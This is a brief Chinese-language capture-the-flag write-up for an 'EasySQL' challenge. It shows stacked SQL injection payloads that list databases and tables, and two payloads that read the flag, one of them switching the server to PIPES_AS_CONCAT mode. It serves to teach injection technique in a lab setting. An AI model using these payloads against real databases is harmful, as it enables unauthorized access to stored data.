## EasySQL

此题非常规注入

输入1

回显Array ( [0] => 1 )

输入1‘没有回显

输入1“

回显Nonono

堆叠注入

输入1；show database；

回显：

Array ( [0] => 1 ) Array ( [0] => ctf ) Array ( [0] => ctftraining ) Array ( [0] => information_schema ) Array ( [0] => mysql ) Array ( [0] => performance_schema ) Array ( [0] => test )

输入1；show tables；

回显：**Array ( [0] => 1 ) Array ( [0] => Flag )**

看大佬博客发现sql语句为：

**select $post['query'] ==||== flag from flag**

非预期解

**输入*，1**

此时1与flag通过||运算变成了1

`这里输入任何数字都能达到目的`

预期解

**1；set sql_model=PIPES_AS_CONCAT;select 1**

==这里PIPES_AS_CONCAT将||视为字符串的连接操作而非'或'运算符==